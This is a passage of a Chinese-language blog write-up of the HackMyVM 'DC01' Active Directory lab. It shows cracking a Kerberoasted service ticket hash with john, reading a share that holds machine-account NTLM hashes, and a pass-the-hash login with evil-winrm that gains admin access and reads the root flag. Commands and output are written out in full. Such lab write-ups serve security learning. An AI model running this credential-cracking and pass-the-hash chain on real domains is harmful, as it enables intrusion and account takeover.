<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>web_svc<span class="token variable">$SOUPEDECODE</span>.LOCAL<span class="token variable">$HTTP</span>/WebServer*<span class="token variable">$a8a4ea82594dfa2f43915f0e31ace64d</span><span class="token variable">$563968fbcf0c5af63ec5000b270a83178254a0f2069c31951d8bd5a5214dce8d70e718db1b91193b94b200c450a1a1e86a1b3a435c7ddf4ac6b8516b151ad6fe5b5cadfe789ea09bc691e5bb8ec84580a6de22a265fee147d14980b1e752d19eba428c392a2bc6ece62f23357faa5162fecd68f0905f8f7f4fff2d120da7ebe91b4a50c4f0c99fc7195c8706870c406d3ac1b402d9c4e88b6b6385441169752771f604ba2fe5bdd30a353d527fe4e603c01194d614d24efde79810f6d9b3690924662f4f8f92d73469bddc7cc9dcfcab27e237a03a9edb1695a3cd61ce582710ed17ebf2b7da03f01f2a7c856c9dbfb7976b9321198e97057fe5a1ffe89f20b5805e2e4b5e3509bc50eff404a148c4317610cfd62f3f7a879fc081ecfd9d208e34d0efbc74c4733f411d04ea61259af26f8beee518fafc13420057a4521b0790952708d8d0263f067263a9fbbbd423fa7c7e73bea0e3ea4941236b55abd439fd76de50cb812129580949d75fb4fc821b36db63df59c569217fca0fdccba9d2d0ef5be3be137e3e2121503ee18e618cdb9c55a144b0b338bc5eaf5eeb5810690c5735fa3dd7f76d4b655afae087f2deccd52f57a3700445391f53bd2dd18d710f00402b7bbdedc1290e39ad634a1c1247565c4a6b8311a311c75ff46f686a231cc6ece228a0a69082a18acf9d9956931f3c709fae86dc962437c280b8c1715f413cc941ea8e08f864cdefdcdb9021e4e17d9e5fb0d74362a905a770d7788e628c75811e290afe2a9986d6b5a5d1113823c27579ec0cf4342bb05a9c63aad389d8b2105ea3d8ecace920adfb67ab8eff17819a0d624c8afe6431fda6e3d7c0af6f72e75a41c64ebb21caca095460c40ec3b56edd171e2a8db507b5c556e5084f0997f60f63f86f7191bc4276e528f5d1aef93ece516d39805ea8ebc25740eccc5c54ce63631a2dda2daa7a848d41a499149eb40e95b63cefa93147450997c82c224ece59f275b5c2e6260a5650302f5ea83801a9a2e3cf37841f97c82edeec629c08d460c5a57b1cc5b5727ef0aa9c2181cb30c2ea74ed7d146e88932888968b95cea497101ac9b2a0dc955ec27cb6f7b4d52b770227b0dd8668dd644e40c4baa3fe999824717fe1e016b7ceb709d4a71ada4339bf4612f1c9062991067a0690494f9d7e68a19a38d0266b14e4a70de72f02ba7c6a73895e6278edcd2096a09aa4abc197c357f546594be6d8284a5e88b2bd03a257cfa7fcad0eed13459e1287999dba8a9d1af63e684d01302a269c77b8c0f19e96e5be56e9efa7569c72609a0e3a2884bf635453f6e237a0d9bde8e1d088e9d472995e16ecf39b909afb28d631cfea9676f0e00d5f98df009365f9e0b96aef92421bc44503625d9d0c5a8409f1b6d2af5c4f047b056b877a6d12c39a460b62463c10a7f3f2cd7e4c7276973a6869f977d49e1370ce555357477658</span></code></pre>
<p>hash保存用john跑一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> john aa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="token number">5</span> password hashes with <span class="token number">5</span> different salts <span class="token punctuation">(</span>krb5tgs, Kerberos <span class="token number">5</span> TGS etype <span class="token number">23</span> <span class="token punctuation">[</span>MD4 HMAC-MD5 RC4<span class="token punctuation">]</span><span class="token punctuation">)</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
Password123<span class="token operator">!</span><span class="token operator">!</span>    <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:01:11 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-07-16 05:58<span class="token punctuation">)</span> <span class="token number">0</span>.01403g/s 201259p/s 955614c/s 955614C/s        <span class="token number">1</span><span class="token punctuation">..</span>1cm
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. </code></pre>
<p>拿到一个密码<code>Password123!!</code>,而且是file_svc的密码，那么尝试访问目录</p>
<h2 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient //192.168.56.128/backup <span class="token parameter variable">-U</span> file_svc
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>file_svc<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:41:17 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                 DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:44:56 <span class="token number">2024</span>
  backup_extract.txt                  A      <span class="token number">892</span>  Mon Jun <span class="token number">17</span> <span class="token number">16</span>:41:05 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10794376</span> blocks available</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> backup_extract.txt                   
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::</code></pre>
<p>拿到了一些服务的hash，尝试使用哈希传递攻击</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.128 <span class="token parameter variable">-u</span> FileServer$ <span class="token parameter variable">-H</span> e41da7e79a4c76dbd9cf79d1cb325559
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine                                                                                                                       
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FileServer$<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
soupedecode<span class="token punctuation">\</span>fileserver$</code></pre>
<p>拿到了shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FileServer$<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /all

<span class="token environment constant">USER</span> INFORMATION
----------------

User Name               SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
soupedecode<span class="token punctuation">\</span>fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SOUPEDECODE<span class="token punctuation">\</span>Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Pre-Windows <span class="token number">2000</span> Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY<span class="token punctuation">\</span>NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE<span class="token punctuation">\</span>Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="token punctuation">\</span>NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="token punctuation">\</span>High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="token keyword">for</span> a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system <span class="token function">time</span>                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force <span class="token function">shutdown</span> from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span class="token keyword">for</span> delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working <span class="token builtin class-name">set</span>                                     Enabled
SeTimeZonePrivilege                       Change the <span class="token function">time</span> zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="token keyword">for</span> another user <span class="token keyword">in</span> the same session Enabled


<span class="token environment constant">USER</span> CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support <span class="token keyword">for</span> Dynamic Access Control on this device has been disabled.</code></pre>
<p>可以看到FileServer属于管理员组,直接能读Administrator下面的root flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">type</span> root.txt
a9564*********ad5ec60a</code></pre>







</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/55ea1c6/" title="HackMyVM-DC01">https://tao0845.github.io/posts/55ea1c6/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/9c57f07c/" rel="prev" title="HackMyVM-DC02"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-DC02</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/54a57065/" rel="next" title="HackMyVM-Simple"><span class="post-nav-text">HackMyVM-Simple</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>